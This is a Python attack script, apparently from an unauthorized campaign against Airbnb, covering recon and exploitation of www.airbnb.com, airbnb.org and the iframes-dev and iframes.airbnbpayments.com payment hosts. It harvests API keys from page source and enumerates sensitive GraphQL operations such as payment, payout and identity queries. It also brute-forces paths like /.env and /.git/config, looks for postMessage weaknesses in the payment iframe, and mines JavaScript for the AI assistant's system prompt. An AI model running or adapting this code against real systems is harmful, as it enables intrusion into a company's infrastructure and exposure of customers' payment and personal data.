#!/usr/bin/env python3
"""Airbnb Phase 3 — Targeted Exploitation Attempts

High-priority targets:
  1. Find valid API key → unlock GraphQL introspection
  2. iframes-dev.airbnbpayments.com — dev CloudFront environment
  3. iframes.airbnbpayments.com — payment iframe analysis
  4. GraphQL operation discovery + batching
  5. Nikhil Jain (known Airbnb GQL ops) pattern matching
  6. CSP bypass attempts on airbnb.org
  7. Help center / AI assistant deeper analysis
"""

import re
import json
import time
import requests
from urllib.parse import urljoin, urlparse, quote

requests.packages.urllib3.disable_warnings()

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
})
S.verify = False

DELAY = 1.5

results = {
    "api_key": None,
    "graphql_findings": [],
    "payments_findings": [],
    "csp_bypass": [],
    "ai_assistant": [],
    "critical_findings": [],
}

def p(msg): print(f"[*] {msg}")
def ok(msg): print(f"[+] {msg}")
def warn(msg): print(f"[!] {msg}")
def crit(msg): print(f"[!!!] {msg}")

def fetch(url, method="GET", **kw):
    time.sleep(DELAY)
    try:
        r = getattr(S, method.lower())(url, timeout=20, allow_redirects=kw.pop("follow", True), **kw)
        return r
    except Exception as e:
        warn(f"  Failed: {type(e).__name__}")
        return None

# ─── 1. Find Valid API Key ───────────────────────────────────────

p("=" * 60)
p("PHASE 3A: Finding Valid Airbnb API Key")
p("=" * 60)

# The GraphQL needs X-Airbnb-API-Key. Let's mine it from the homepage more carefully.
r = fetch("https://www.airbnb.com/")
api_key = None
if r and r.status_code == 200:
    body = r.text
    
    # Pattern 1: Direct API key in config
    for m in re.finditer(r'(?:api_key|apiKey|API_KEY|AIRBNB_API_KEY|x-airbnb-api-key)["\']?\s*[:=,]\s*["\']([a-zA-Z0-9_\-]{20,80})["\']', body, re.I):
        key = m.group(1)
        ok(f"  Potential key (config): {key}")
        api_key = key
    
    # Pattern 2: In JSON config blobs
    for m in re.finditer(r'"key"\s*:\s*"([a-f0-9]{32,64})"', body):
        key = m.group(1)
        ok(f"  Potential key (JSON): {key}")
        if not api_key:
            api_key = key
    
    # Pattern 3: Look in script tags for Airbnb-specific patterns
    for m in re.finditer(r'<script[^>]*>(.*?)</script>', body, re.DOTALL):
        script = m.group(1)
        for km in re.finditer(r'["\']([a-f0-9]{32})["\']', script):
            candidate = km.group(1)
            if len(candidate) == 32:
                ok(f"  32-char hex candidate: {candidate}")
                if not api_key:
                    api_key = candidate

# Also fetch a listing page which might reveal the key in a different context
p("Fetching a listing page for additional key sources...")
r = fetch("https://www.airbnb.com/s/New-York/homes")
if r and r.status_code == 200:
    for m in re.finditer(r'(?:api_key|apiKey|API_KEY|x-airbnb-api-key|key)["\']?\s*[:=,]\s*["\']([a-zA-Z0-9_\-]{20,80})["\']', r.text, re.I):
        key = m.group(1)
        ok(f"  Key from search page: {key}")
        if not api_key:
            api_key = key

# Fetch help page
p("Fetching help center for key...")
r = fetch("https://www.airbnb.com/help")
if r and r.status_code == 200:
    for m in re.finditer(r'(?:api_key|apiKey|API_KEY|key)["\']?\s*[:=,]\s*["\']([a-zA-Z0-9_\-]{20,80})["\']', r.text, re.I):
        key = m.group(1)
        ok(f"  Key from help page: {key}")
        if not api_key:
            api_key = key

# Now test the API key candidates
if api_key:
    ok(f"\nTesting API key: {api_key}")
    r = fetch("https://www.airbnb.com/api/v3/graphql", method="POST",
              headers={
                  "Content-Type": "application/json",
                  "X-Airbnb-API-Key": api_key,
              },
              data=json.dumps({"query": "{ __typename }"}))
    if r:
        ok(f"  Response: {r.status_code} — {r.text[:300]}")
        if "invalid_key" not in r.text.lower():
            crit(f"  API KEY WORKS! {api_key}")
            results["api_key"] = api_key
        else:
            warn("  Key rejected")

# Try the original key with proper endpoint format
p("\nTrying format variations with original key...")
OLD_KEY = "d306zoyjsyarp7ifhu67rjxn52tv0t20"
for ep_suffix in ["", "/StaysSearch", "/ExploreSearch", "/PdpPlatformSections"]:
    ep = f"https://www.airbnb.com/api/v3{ep_suffix}"
    r = fetch(ep, method="POST",
              headers={
                  "Content-Type": "application/json",
                  "X-Airbnb-API-Key": OLD_KEY,
              },
              data=json.dumps({
                  "operationName": "StaysSearch" if "Stays" in ep_suffix else None,
                  "variables": {},
                  "extensions": {
                      "persistedQuery": {
                          "version": 1,
                          "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000",
                      }
                  }
              }))
    if r:
        ok(f"  {ep}: {r.status_code} — {r.text[:200]}")
        if r.status_code == 200 and "invalid_key" not in r.text.lower():
            crit(f"  ENDPOINT ACCEPTS KEY! {ep}")
            results["api_key"] = OLD_KEY

# ─── 2. iframes-dev.airbnbpayments.com ──────────────────────────

p("")
p("=" * 60)
p("PHASE 3B: iframes-dev.airbnbpayments.com (DEV CloudFront)")
p("=" * 60)

dev_base = "https://iframes-dev.airbnbpayments.com"

# Test root
r = fetch(dev_base)
if r:
    ok(f"  Root: {r.status_code} — {len(r.text)} bytes — Final: {r.url}")
    if r.status_code == 200:
        # Check for debug info
        if "debug" in r.text.lower() or "staging" in r.text.lower() or "dev" in r.text.lower():
            warn("  DEV/DEBUG/STAGING references in page!")
        
        # Check security headers
        for h in ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"]:
            v = r.headers.get(h, "MISSING")
            if v == "MISSING":
                warn(f"  {h}: MISSING")
            else:
                ok(f"  {h}: {v[:80]}")
        
        # Mine JS files
        js_refs = re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', r.text)
        ok(f"  JS files: {len(js_refs)}")
        for jsf in js_refs[:10]:
            p(f"    {jsf}")
        
        # Look for payment-related forms
        forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.DOTALL | re.I)
        if forms:
            warn(f"  {len(forms)} form(s) found on DEV payments page!")
            for form in forms[:3]:
                action = re.search(r'action=["\']([^"\']+)["\']', form, re.I)
                if action:
                    warn(f"    Form action: {action.group(1)}")

# Test paths
dev_paths = [
    "/",
    "/health",
    "/status",
    "/debug",
    "/admin",
    "/api/",
    "/graphql",
    "/robots.txt",
    "/.env",
    "/config",
    "/version",
    "/info",
    "/metrics",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/swagger-ui.html",
    "/swagger.json",
    "/internal/",
    "/test/",
]

for path in dev_paths:
    url = f"{dev_base}{path}"
    r = fetch(url)
    if not r:
        continue
    if r.status_code not in (404, 403):
        ok(f"  {path}: {r.status_code} — {len(r.text)} bytes")
        if r.status_code == 200 and len(r.text) < 5000 and len(r.text) > 0:
            p(f"    Preview: {r.text[:300]}")

# ─── 3. iframes.airbnbpayments.com (Production) ─────────────────

p("")
p("=" * 60)
p("PHASE 3C: iframes.airbnbpayments.com (Production Payments)")
p("=" * 60)

prod_base = "https://iframes.airbnbpayments.com"

r = fetch(prod_base)
if r:
    ok(f"  Root: {r.status_code} — {len(r.text)} bytes")
    
    # Security headers
    for h in ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security",
              "X-Content-Type-Options"]:
        v = r.headers.get(h, "MISSING")
        if v == "MISSING":
            warn(f"  {h}: MISSING")
        else:
            ok(f"  {h}: {v[:80]}")
    
    if r.status_code == 200:
        # Analyze payment iframe content
        body = r.text
        
        # Credit card fields?
        if re.search(r'(?:card|payment|credit|stripe|braintree|adyen)', body, re.I):
            ok(f"  Payment-related content detected!")
        
        # postMessage analysis — key for iframe security
        postmsg = re.findall(r'(?:postMessage|addEventListener[^)]*message)', body)
        if postmsg:
            warn(f"  postMessage usage detected ({len(postmsg)} refs) — potential XSS via framing!")
            results["payments_findings"].append({
                "type": "postmessage_in_payment_iframe",
                "count": len(postmsg),
                "detail": "Payment iframe uses postMessage — needs origin validation check",
            })
        
        # Check for origin validation in postMessage handlers
        origin_checks = re.findall(r'(?:origin|source)\s*[!=]==?\s*["\'][^"\']+["\']', body)
        if not origin_checks and postmsg:
            crit("  postMessage WITHOUT origin validation in payment iframe!")
            results["critical_findings"].append({
                "type": "postmessage_no_origin_check",
                "target": prod_base,
                "severity": "high",
                "detail": "Payment iframe postMessage handler may lack origin validation",
            })
        
        # Extract JS for deeper analysis
        js_refs = re.findall(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', body)
        ok(f"  JS files: {len(js_refs)}")
        for jsf in js_refs[:5]:
            p(f"    {jsf}")
            if jsf.startswith("/"):
                jsf = f"{prod_base}{jsf}"
            if jsf.startswith("http"):
                jr = fetch(jsf)
                if jr and jr.status_code == 200:
                    # Check for postMessage origin validation
                    if "postMessage" in jr.text:
                        origin_patterns = re.findall(r'\.origin\s*[!=]==?\s*["\']([^"\']+)["\']', jr.text)
                        if origin_patterns:
                            ok(f"      Origin whitelist: {origin_patterns[:5]}")
                        else:
                            warn(f"      postMessage without explicit origin check!")
                    
                    # Check for API keys, tokens
                    for m in re.finditer(r'(?:api[_-]?key|token|secret)\s*[:=]\s*["\']([^"\']{10,})["\']', jr.text, re.I):
                        warn(f"      Secret in payment JS: {m.group(0)[:60]}")
                        results["payments_findings"].append({
                            "type": "secret_in_payment_js",
                            "value_preview": m.group(0)[:60],
                        })

# ─── 4. GraphQL with persisted queries ──────────────────────────

p("")
p("=" * 60)
p("PHASE 3D: GraphQL Persisted Query Enumeration")
p("=" * 60)

# Known Airbnb GraphQL operations from public bug reports and docs
KNOWN_OPS = [
    "StaysSearch",
    "ExploreSearch", 
    "PdpPlatformSections",
    "GetListingCalendar",
    "GetPaymentMethods",
    "GetReservations",
    "GetHostedListings",
    "UserProfile",
    "GetAccountSettings",
    "GetPhoneNumbers",
    "GetNotifications",
    "GetMessages",
    "GetConversation",
    "GetReviews",
    "GetWishlists",
    "VerifyPhone",
    "UpdateListing",
    "CreateReservation",
    "CancelReservation",
    "GetPayoutMethods",
    "GetTransactionHistory",
    "GetUserIdentity",
    "SearchExperiences",
    "GetHelpArticles",
    "ContactSupport",
    "GetAIAssistant",
    "ChatWithAI",
    "AIConversation",
    "CreateSupportTicket",
]

# Batch test with API key from JS
TEST_KEY = api_key or OLD_KEY

for op in KNOWN_OPS:
    p(f"  Testing operation: {op}")
    
    # Method 1: operationName in body
    r = fetch("https://www.airbnb.com/api/v3/" + op, method="GET",
              headers={
                  "X-Airbnb-API-Key": TEST_KEY,
                  "Accept": "application/json",
              },
              params={
                  "operationName": op,
                  "variables": "{}",
              })
    if r:
        if r.status_code == 200:
            body = r.text[:500]
            if "PersistedQuery not found" in body:
                ok(f"    {op}: Operation EXISTS but hash unknown")
                results["graphql_findings"].append({
                    "type": "operation_exists",
                    "name": op,
                })
            elif "invalid_key" not in body.lower() and "error" not in body.lower()[:50]:
                crit(f"    {op}: RETURNS DATA! {body[:200]}")
                results["graphql_findings"].append({
                    "type": "operation_returns_data",
                    "name": op,
                    "preview": body[:200],
                })
            elif "invalid_key" in body.lower():
                p(f"    {op}: Invalid key")
            else:
                ok(f"    {op}: {body[:150]}")

# ─── 5. GraphQL Batching ────────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 3E: GraphQL Batching Test")
p("=" * 60)

# Test if batching is supported
batch_query = json.dumps([
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
])

r = fetch("https://www.airbnb.com/api/v3/graphql", method="POST",
          headers={
              "Content-Type": "application/json",
              "X-Airbnb-API-Key": TEST_KEY,
          },
          data=batch_query)
if r:
    ok(f"  Batching test: {r.status_code} — {len(r.text)} bytes")
    if r.status_code == 200:
        try:
            data = r.json()
            if isinstance(data, list):
                warn(f"  BATCHING SUPPORTED! {len(data)} responses returned")
                results["graphql_findings"].append({
                    "type": "batching_supported",
                    "count": len(data),
                })
        except:
            pass
    p(f"  Response: {r.text[:300]}")

# ─── 6. Help Center / AI Assistant Deep Dive ────────────────────

p("")
p("=" * 60)
p("PHASE 3F: Help Center & AI Assistant Deep Analysis")
p("=" * 60)

# The AI assistant requires login. Let's check what endpoints it uses.

# First, analyze the help center page structure
p("Analyzing help center JS bundles...")
r = fetch("https://www.airbnb.com/help")
if r and r.status_code == 200:
    # Find all JS files that might be help/AI related
    all_js = set()
    for m in re.finditer(r'(?:src|href)=["\']([^"\']*\.js[^"\']*)["\']', r.text):
        url = m.group(1)
        if url.startswith("//"):
            url = "https:" + url
        elif url.startswith("/"):
            url = "https://www.airbnb.com" + url
        all_js.add(url)
    
    ok(f"  Help page has {len(all_js)} JS bundles")
    
    # Analyze each for AI/chat/assistant references
    for js_url in sorted(all_js)[:20]:
        if not js_url.startswith("http"):
            continue
        r2 = fetch(js_url)
        if not r2 or r2.status_code != 200:
            continue
        
        body = r2.text
        
        # Look for AI assistant related code
        ai_indicators = [
            (r'(?:assistant|chatbot|ai_chat|aiChat|AiAssistant)', "AI Assistant ref"),
            (r'(?:system_prompt|systemPrompt|system_message)', "System prompt ref"),
            (r'(?:openai|anthropic|claude|gpt-4|gpt-3|llm)', "LLM provider ref"),
            (r'(?:prompt_injection|injection_guard|sanitize_prompt)', "Injection guard ref"),
            (r'(?:contact.us|contactUs|help.contact)', "Contact flow ref"),
            (r'(?:conversation|thread|chat_id|chatId|messageId)', "Chat state ref"),
            (r'(?:websocket|wss://|socket\.io|signalr)', "Realtime channel ref"),
        ]
        
        found_any = False
        for pattern, label in ai_indicators:
            matches = re.findall(pattern, body, re.I)
            if matches:
                if not found_any:
                    ok(f"  In {js_url.split('/')[-1][:40]}:")
                    found_any = True
                warn(f"    {label}: {len(matches)} match(es) — e.g. {matches[0]}")
                
                # If system prompt related, extract context
                if "prompt" in label.lower():
                    for m in re.finditer(r'(?:system_prompt|systemPrompt)["\']?\s*[:=]\s*["\']([^"\']{10,})["\']', body, re.I):
                        crit(f"    SYSTEM PROMPT FOUND: {m.group(1)[:200]}")
                        results["critical_findings"].append({
                            "type": "system_prompt_leak",
                            "value": m.group(1)[:500],
                            "source": js_url,
                            "severity": "high",
                        })

# Try API patterns for AI assistant
p("\nTesting AI-related API patterns...")
ai_api_patterns = [
    "/api/v3/AIConversation",
    "/api/v3/GetAIAssistant",
    "/api/v3/ChatWithAI",
    "/api/v3/CreateSupportConversation",
    "/api/v3/GetSupportConversation",
    "/api/v3/SendMessage",
    "/api/v3/HelpCenterSearch",
    "/api/v3/ContactUs",
    "/help/api/conversation",
    "/help/api/assistant",
    "/help/api/chat",
    "/api/v2/help_center/articles",
    "/api/v2/support_messaging",
]

for path in ai_api_patterns:
    url = f"https://www.airbnb.com{path}"
    
    # GET test
    r = fetch(url, headers={"X-Airbnb-API-Key": TEST_KEY, "Accept": "application/json"})
    if r:
        if r.status_code not in (404, 301, 302):
            ok(f"  {path}: {r.status_code} — {len(r.text)} bytes")
            if r.status_code == 200:
                p(f"    {r.text[:300]}")
            elif r.status_code in (401, 403):
                ok(f"    Exists but requires auth!")
                results["ai_assistant"].append({
                    "endpoint": path,
                    "status": r.status_code,
                    "needs_auth": True,
                })

# ─── 7. Directory Brute-Force on Key Paths ──────────────────────

p("")
p("=" * 60)
p("PHASE 3G: Path Discovery on Key Assets")
p("=" * 60)

path_wordlist = [
    "/.git/HEAD",
    "/.git/config",
    "/.env",
    "/.env.local",
    "/debug/",
    "/debug/vars",
    "/debug/pprof",
    "/server-status",
    "/server-info",
    "/_debug",
    "/trace",
    "/internal",
    "/admin",
    "/console",
    "/phpmyadmin",
    "/wp-admin",
    "/sitemap.xml",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/.well-known/security.txt",
    "/.well-known/openid-configuration",
    "/oauth/.well-known/openid-configuration",
    "/.well-known/jwks.json",
    "/feed",
    "/rss",
]

for base in ["https://www.airbnb.org", "https://iframes-dev.airbnbpayments.com"]:
    p(f"\nBrute-forcing {base}...")
    for path in path_wordlist:
        url = f"{base}{path}"
        r = fetch(url)
        if not r:
            continue
        if r.status_code == 200:
            ok(f"  {path}: 200 — {len(r.text)} bytes")
            if ".git" in path:
                crit(f"  GIT EXPOSED! {url}")
                results["critical_findings"].append({
                    "type": "git_exposure",
                    "url": url,
                    "severity": "high",
                })
            if ".env" in path:
                crit(f"  ENV FILE EXPOSED! {url}")
                results["critical_findings"].append({
                    "type": "env_exposure",
                    "url": url,
                    "severity": "critical",
                })
            if len(r.text) < 2000:
                p(f"    {r.text[:300]}")
        elif r.status_code == 403:
            p(f"  {path}: 403 (exists, forbidden)")

# ─── SUMMARY ────────────────────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 3 SUMMARY")
p("=" * 60)

ok(f"API key found:         {'Yes — ' + str(results['api_key']) if results['api_key'] else 'No valid key'}")
ok(f"GraphQL findings:      {len(results['graphql_findings'])}")
ok(f"Payment findings:      {len(results['payments_findings'])}")
ok(f"CSP bypass findings:   {len(results['csp_bypass'])}")
ok(f"AI assistant findings: {len(results['ai_assistant'])}")
ok(f"CRITICAL findings:     {len(results['critical_findings'])}")

for f in results["critical_findings"]:
    crit(f"  [{f.get('severity','?').upper()}] {f['type']} — {f.get('url', f.get('target', f.get('detail', '')))}")

for f in results["graphql_findings"]:
    ok(f"  [GQL] {f['type']} — {f.get('name', f.get('endpoint', ''))}")

with open("/tmp/airbnb_phase3_results.json", "w") as f:
    json.dump(results, f, indent=2, default=str)

ok("Results saved to /tmp/airbnb_phase3_results.json")
ok("Phase 3 complete")
